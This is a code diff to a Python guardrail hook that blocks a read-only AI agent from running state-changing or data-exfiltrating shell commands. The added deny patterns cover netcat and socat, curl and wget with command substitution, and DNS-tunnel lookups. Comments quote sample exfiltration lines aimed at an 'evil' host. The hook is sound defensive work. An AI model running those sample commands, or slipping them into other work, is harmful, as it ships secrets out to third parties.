@@ -11,15 +11,21 @@ log/diff/status, grep, curl GET, redirect to /dev/null, etc.) pass through untou
 Scope: this is a guardrail for a COOPERATIVE agent, not a sandbox. It blocks the common
 state-changing commands: cf writes, gh/GitHub writes, git writes, file/process/service
 mutations, package installs, HTTP writes, output redirection to a file, tee, cp,
-in-place sed/perl, and common nested shell/interpreter bypasses. Pair it with OS-level
-least-privilege credentials for defense in depth.
+in-place sed/perl, and common nested shell/interpreter bypasses. It also blocks the
+common DATA-EGRESS / exfiltration channels (the lethal-trifecta exit): raw-socket tools
+(nc/ncat/netcat/socat/telnet), HTTP egress carrying command substitution, and DNS-tunnel
+lookups carrying substitution — a read-only agent can read secrets, so it must not be able
+to ship them out. Plain GET health checks and plain DNS lookups still pass. Pair it with
+OS-level least-privilege credentials and an outbound allowlist for defense in depth.
 Covered by scripts/test_readonly_guard.py (pure-stdlib, runs offline).
 
 Decision is returned as a permissionDecision JSON on stdout with exit 0 (the documented
 non-error path). See https://code.claude.com/docs/en/hooks
 
-Cross-platform: pure Python stdlib, no jq. On systems where the interpreter is `python3`,
-adjust the hook command accordingly (this repo's agent frontmatter uses `python`).
+Cross-platform: pure Python stdlib, no jq. The agent hook frontmatter invokes this as
+`python3 ... || python ...` so a `python3`-only host doesn't silently fail open (a missing
+interpreter would skip the hook and ALLOW the command); the fallback keeps Windows, where
+the launcher is usually `python`, working too.
 """
 import json
 import re
@@ -78,8 +84,8 @@ _DENY_PATTERNS = [
     # GNU install copies/creates files; anchored to command position because 'install'
     # is also a common path component (e.g. `ls /opt/install`) and a package subcommand.
     _CMD + r"install\b",
-    # interactive editors and awk are file writers (in command position to avoid grep'd-text false positives)
-    _CMD + r"(vim|vi|nvim|nano|emacs|ex|pico)\b",
+    # interactive/line editors and awk are file writers (in command position to avoid grep'd-text false positives)
+    _CMD + r"(vim|vi|nvim|nano|emacs|ex|pico|ed)\b",
     r"\b[gmn]?awk\b.*system\s*\(",
     # PowerShell mutations, for Windows shells behind the Bash tool name
     r"\b(Remove-Item|Move-Item|Copy-Item|New-Item|Set-Content|Add-Content|Out-File|"
@@ -108,6 +114,19 @@ _DENY_PATTERNS = [
     r"\bcurl\b.*(\s(?-i:-O)\b|\s--remote-name\b|\s(?-i:-o)\s+(?!/dev/null|-)|\s(?-i:-T)\s|\s--upload-file\b)",
     r"\bwget\b(?!.*(-O\s*-|-qO-|--output-document[= ]-))",  # wget writes a file unless piped to stdout
     r"\bscp\b",
+    # --- Data-egress / exfiltration channels (the lethal-trifecta exit) ------------------
+    # A read-only agent can read secrets; these stop it from shipping them out. Raw-socket
+    # tools are a clean exfil channel with no read-only-triage need on our stack (ThousandEyes
+    # owns synthetics; `curl -v https://host` covers HTTP reachability). Command-position
+    # anchored, so `cat secret | nc evil 443` is caught at the pipe too.
+    _CMD + r"(nc|ncat|netcat|socat|telnet)\b",
+    # HTTP egress that embeds command/process substitution — `curl "...?d=$(cat secret)"` or
+    # a backtick/`<(...)`. Bounded to the curl/wget segment via [^|;&] so a downstream
+    # `| grep $(...)` is NOT a false positive; plain GET health checks have no substitution.
+    r"\b(curl|wget)\b[^|;&]*(\$\(|`|<\()",
+    # DNS-tunnel exfil — dig/nslookup/host carrying substitution (`dig $(whoami).evil.com`).
+    # Command-position anchored; plain lookups (`dig example.com`) still pass.
+    _CMD + r"(dig|nslookup|host)\b[^|;&]*(\$\(|`|<\()",
     # Nested shells/interpreters are too easy to use as mutation bypasses.
     # Shell interpreters: -c / /c / -Command run an inline command string.
     r"\b(bash|sh|zsh|pwsh|powershell|cmd)\b.*\s(-c|/c|-Command)\b",
@@ -122,8 +141,10 @@ _DENY_RE = re.compile("|".join(_DENY_PATTERNS), re.IGNORECASE)
 _REASON = (
     "Blocked: this is a read-only agent. The command appears to change state "
     "(deploy/scale/restart, GitHub or git write, file/process/service mutation, package install, "
-    "nested shell, or an HTTP write). Recommend the action instead and hand off to the owning "
-    "writer agent to execute with human sign-off (see the production-change-gate skill for prod)."
+    "nested shell, or an HTTP write) or to exfiltrate data (raw-socket tool, or HTTP/DNS egress "
+    "carrying command substitution). For reachability use ThousandEyes or a plain `curl`/`dig`; "
+    "for a state change, recommend it and hand off to the owning writer agent with human sign-off "
+    "(see the production-change-gate skill for prod)."
 )
 
 
